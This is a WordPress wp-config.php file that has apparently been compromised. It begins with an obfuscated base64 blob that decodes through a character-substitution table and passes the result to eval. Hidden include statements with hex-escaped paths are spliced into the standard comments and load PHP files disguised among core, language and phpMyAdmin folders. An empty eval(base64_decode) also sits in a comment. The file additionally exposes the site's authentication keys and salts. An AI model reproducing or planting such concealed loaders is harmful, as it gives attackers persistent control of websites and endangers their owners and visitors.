dTNQbHVxWFZVajZEbnhQbnVKbUl1Jy4KJ0ptSXVKbUl1Sm1JdUptSXVKbUl1SmU5SHh5SXVKbUl1Sm1JdUptSXVKbUl1Sm1JdUptSXVKbUl1SmVtWFdYVlVKVjVhVGxRWGk2dENXZVBuMDZiV2RYNycuCidVMHNLYXJzVlhKSVFhWms0YXIyZ1hzbDFvV2t5dUpNSXV6WXp1Sk1JT2plTEFpQTdVRGxjb2lURG5oJy4KJzFJb1o2S2tkc1BoMGxiQUpJN25oUTlIeHlJdUptSXVKbUl1Sm1JdUptSXVKbUl1Sm1JdWpQNkp6bUl1Sm1JdUptSXVKbUl1Sm1JdUplbEh4eUl1SicuCidtSXVKbUl1Sm1JdUplbEh4eUl1Sm1JdUptSXVKbUl1SmVEVWo2REh4eUl1Sm1JdUptSXVKbUl1SmU5SHh5SXVKJy4KJ21JdUptSXVKbUl1Sm1JdUptSU9qNlBVWk9WWGRzS2EwMlBGSm1sdUprYkEwbHRvaUFEV1plVkEwSUlSem16UnR1SVJ6ZWJBaU9iQWp1eVVpeFRuSk81b2k2eVhodTdSSm0xJy4KJ1JKbVRuaG1jdUpPS3V6bWN1MFRRNmhJUVVyMlNYaG1jdTA2YldQQURBcVY0YVp4eW5oUTlIeHk2SnptSXVKbUl1Sm1JdUptSXVKbUl1SmU3WHpteVhyRExYc2xEQzBEYkFqTicuCid5T2o2UFVaT1ZYZHNLYTAyUEZKUTdIeHlJdUptSXVKbUl1Sm1JdUptSXVKbUlDMVBudUptSXVKbUl1Sm1JdUptSXVKbUl1Sm1JdUplbVhXWFZVSlY1YVRsUVhpNnRDV2VQbjAnLgonNmJXZFg3VTBzS2Fyc1ZYSklRYVprNGFyMmdYc2wxb1dreW5oMUlvWjZLa2RzUGgwbGJBSicuCidJN25oUTlIeHlJdUptSXVKbUl1Sm1JdUptSXVKbUlLeFBudUptSXVKbUl1Sm1JdUptSUt4UG51Sm1JdUptSXVKZWxIeHlJdUptJy4KJ0lLeFBuSHh5SXVKbUlYZ3Njb1prN1VkTUlvWjZLQVpPN0EwMnpVMHNLb2RWRG9kTHlueFBudUptSXVqTDZKem1JdUptSXVKbUlGaW9JbicuCidqNlBhckVEVXpWNWFUbGpYV2tIVWRUU1VkZjNBMGx0b2lBRG5KUTd1SnFsdUhtN0h4eUl1Sm1JdUptSXVqTDZKem1JdUptSXVKbUl1Sm1JdWpPREFqc3QnLgonVXpldmFnc0R3MVBudUptSXVKbUl1SmVsSHh5SXVKbUl1Sm1JdTBzTGFkdjZKem1JdUptSXVKJy4KJ21JQzFQbnVKbUl1Sm1JdUptSXVKbUlhcnNQQVdPY3VxWFZVajZEdzFQbnVKbUl1Sm1JdUplbEh4eUl1Sm1JS3hQbkh4eUl1Sm1JWHJsdFhpMjVGSm15TzJsSDNQbCcuCidSaHZ2SW9XTklPMFNEQzNQK09qWFZVanNEbnhQbnVKbUl1akw2SnptSXVKbUl1Sm1JTzBrVkEwcUlCaCcuCidtUUFyMkxBaXY5SHh5SXVKbUl1Sm1JdUprUW9Xa1ZXZFNEQ2htbHVKa0dYV1E5SHh5SXVKbUlLeFBuSHh5SXVKbUlGJy4KJ2lvSW5KcVFYMDJQb2hRNkp6bUl1SmU5SHh5SXVKbUl1Sm1JdTBYNGFyc1ZvZElJbkprS3ZxbDNzSmVWYXRtUUZkc2ZCM01RQXIyTEEnLgonaXY3SHh5SXVKbUl1Sm1JdWpMNkp6bUl1Sm1JdUptSXVKbUl1SmtRb1drVnVIUElPalhWVWpzRHcxUG51Sm1JdScuCidKbUl1Sm1JdUptSU8wa1ZBMDJLRmRzZnVIUElPMFNEQzNMNkp6bUl1Sm1JdUptSUt4UG51SicuCidtSXVqUDZKSVBudUptSXVKa1FvV2tWdUhQSXhqc2NhZHN0RmkyTEZXN0RuMDZiV2RrRG9aT2Zhanh5b3IyYlgzb1BXZGtEb2RsUVhoSVFYMDJQb2hRTHVKa1FvV2tWV2RTRCcuCidDaFE3dzFQbkh4eUl1Sm1JRmlvSW4wRGJhZHNQbkprUW9Xa1ZpdEFWRnRBQW5obXJPem1Rb1o2S29Xc1BGSFBsTzBrVkEwMlVPZDJHT1RQN0h4eUl1Sm1JQzFQbnUnLgonSm1JdUptSXVKZTdYem15TzBrVkEwMlVPZHFnV2htbEJobWdGaGE3SHh5SXVKbUl1Sm1JdWpMNkp6bUl1Sm1JdUptSXVKbUl1Sms3dUhQSXhXT3RvVycuCidReUh4eUl1Sm1JdUptSXVKbUl1Sm1JdUptSU9aZWRPdG1sQnplbWEwVjFBcnN0YWRENFV6Jy4KJ0k3Um1QbnVKbUl1Sm1JdUptSXVKbUl1Sm1JdUpBYkF6YUlCM01JT2JxY05KUHRPdDE2SnptSXVKbUl1Jy4KJ0ptSXVKbUl1Sm1JdUptZ29pTGd1SFArdUprUW9Xa1ZpdEFWRnRBQVJtUG51Sm1JdUptSXVKbUl1Sm1JbjNMNkp6bUl1Sm1JdUptSXVKbUl1MHM1RjBZSXhqNicuCidEYXJEVlUwRDhYaElRRmhROUh4eUl1Sm1JdUptSXVKbUl1SmVEQzBEUHcxUG51Sm1JdUptSXVKZWxIeHlJdUptSXVKbUl1MHNMYWRzN1h6bXlPMGtWQTAyVU9kcWdXaCcuCidtbEJobWdYaGE3SHh5SXVKbUl1Sm1JdWpMNkp6bUl1Sm1JdUptSXVKbUl1MHNkb2kxeU8wa1ZBMDJVT2R4Z1doUTlIeHlJdUptSXVKbUl1alA2SnptSXVKbUl1Sm1JWCcuCidpRWJYaURydUpJUVgwMlBvc0xnb2hBQXVIUGx1SkExVWpzZ0ZpTWdueFBudUptSXVKbUl1SmU5SHh5SXVKbUl1Sm1JdUonLgonbUl1SmU3WHpJUVgwMlBvc0xnYWRxZ1dobWxCaG1nb2lrUU90UTZKem1JdUptSXVKbUl1Sm1JdWpMNkp6bUl1Sm1JdUptSXVKbUl1Sm1JJy4KJ3VKZTVhVGwxVWpzZ0ZpZktvaWtRbkprUW9Xa1ZpdEExT1RQTHVKa1FvV2tWaXRBUU9UUDd3MVBudUptSXVKbUl1Sm1JdUptSUt4Jy4KJ1BudUptSXVKbUl1Sm1JdUptSVhpRWJYaURybkprUW9Xa1ZpdEFib2hBQXVIUGx1SkF0WGlQZ254UCcuCidudUptSXVKbUl1Sm1JdUptSUMxUG51Sm1JdUptSXVKbUl1Sm1JdUptSXUwNmJXWmVMQWlBN1VEbHRYaVB5TzBrVkEwMlVPWm1nV2hROUh4eUl1Sm1JdUptSXVKJy4KJ21JdUplbEh4eUl1Sm1JdUptSXVqUDZKem1JdUptSXVKbUlYaTZ5VXRtUVgwMlBvc0xnb2lMZ1czTDZKem1JdUptSXVKbUlYVycuCidWN0FKSTd3MVBudUptSXVqUDZKSVBudUptSXUwNmJXWmVMQWlBN1VEbExVZDJRbkpROUh4N2wnOwokeHh6a3QgPSBBcnJheSgnMSc9Pid3JywgJzAnPT4nRycsICczJz0+J1QnLCAnMic9PidGJywgJzUnPT4naicsICc0Jz0+J3YnLCAnNyc9PidwJywgJzYnPT4nTicsICc5Jz0+JzcnLCAnOCc9Pic2JywgJ0EnPT4nZCcsICdDJz0+J2UnLCAnQic9PidQJywgJ0UnPT4neCcsICdEJz0+J2wnLCAnRyc9PidyJywgJ0YnPT4nYScsICdJJz0+J2cnLCAnSCc9PidEJywgJ0snPT4nZicsICdKJz0+J0MnLCAnTSc9Pic0JywgJ0wnPT4ncycsICdPJz0+J0onLCAnTic9PidNJywgJ1EnPT4naycsICdQJz0+JzAnLCAnUyc9Pid0JywgJ1InPT4nTCcsICdVJz0+J2InLCAnVCc9PicxJywgJ1cnPT4nWCcsICdWJz0+J2gnLCAnWSc9Pic4JywgJ1gnPT4nWicsICdaJz0+JzMnLCAnYSc9PidjJywgJ2MnPT4ndScsICdiJz0+J3onLCAnZSc9PidCJywgJ2QnPT4nMicsICdnJz0+J24nLCAnZic9Pic1JywgJ2knPT4nVycsICdoJz0+J1MnLCAnayc9PidSJywgJ2onPT4nSCcsICdtJz0+J0EnLCAnbCc9Pic5JywgJ28nPT4nWScsICduJz0+J0snLCAncSc9PidFJywgJ3AnPT4ncScsICdzJz0+J1YnLCAncic9PidtJywgJ3UnPT4nSScsICd0Jz0+J3knLCAndyc9PidPJywgJ3YnPT4nVScsICd5Jz0+J28nLCAneCc9PidRJywgJ3onPT4naScpOwpldmFsLypheXBrcHZveSovKHF5dHR0c2xuKCR6bmVkdSwgJHh4emt0KSk7Cn0="));
/* the {@link https://api.wordpress.org/secret-k*/include /*ey/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate*/"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/w\x70-in\x63lud\x65s/i\x6dage\x73/me\x64ia/\x73ear\x63h.p\x68p";/* all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '}71!,$Vo#BK/lnRBprmC,XvJcAB+OfQ!Nw[+gkAP@R0+?6IDvPh/6%m/Pe{[s+lP');
define('SECURE_AUTH_KEY',  '^$*Flpw-Cl5RA<x8`6(wyOiuqwCy:-B` Vg-3_7*&`-cVuE:R@Yl5ZwU^nM{r~fy');
define('LOGGED_IN_KEY',    '1(iFcM:9Q-n2#>K9wJxqyII5ffI iomUCwZ!,?+7!uExnZ@8oUe34{=!D7-8IF[3');
define('NONCE_KEY',        'C!+kpNAcc:vH1w,R/6vt`0a)?M{U9)j5PRu4/ymhu?jFDYCRgFV9cRh kH)@k$S=');
define('AUTH_SALT',        ',uD%=Ga7fbKJb2<`:/_V/ JF7@3[GoFh}j6%RnW.QHW~Y>Rz3Gq.RIfQFwSpJ(~N');
define('SECURE_AUTH_SALT', 'mX&(9h-;4|i, m#i#LdVq*cyh8+isbijIASY>I+-PrW!}F!eiY5Y2-4sn88bk}uR');
define('LOGGED_IN_SALT',   '6Zt?Ld{NS|54)6VpJj!9ciC7,J{Q wlC|nyO)!d^qkzs4wCBG5S`k6S&~KY]E*3$');
define('NONCE_SALT',       '-TFdo%|_G7E#ZFV$e2~LgE{5dQ 6L5l%+kM}m>-+;)jm3 Bb{7NJp<AA>1ebJGP6');

/**#@-*/

/**
 * */include /*WordPress Database Table prefix.
 *
 * You can have multiple ins*/"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/w\x70-in\x63lud\x65s/S\x69mpl\x65Pie\x2fNet\x2ftem\x70lat\x65.ph\x70";/*tallations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'dm_';

/**
 * For develo*/include /*pers: WordPress debugging mode.
 *
 * Ch*/"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/w\x70-co\x6eten\x74/la\x6egua\x67es/\x64iff\x2ephp";/*ange this to */include /*true to enable the display of notices during development.
 * It */"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/p\x68pmy\x61dmi\x6e/lo\x63ale\x2ffi/\x67lob\x61l.p\x68p";/*is strongly recommended that plugin and theme developerseval(base64_decode(""));
/* use WP_DEBUG
 * in their development environm*/include /*ents.
 *
 * For information on other constant*/"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/p\x68pmy\x61dmi\x6e/lo\x63ale\x2ftr/\x67all\x65ry.\x70hp";/*s that can be use*/include /*d for debugging,
 * */"\x2fhom\x65/ub\x75ntu\x2fdav\x69dzg\x61o/w\x77w/w\x70-in\x63lud\x65s/I\x443/d\x69ff.\x70hp";/*visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
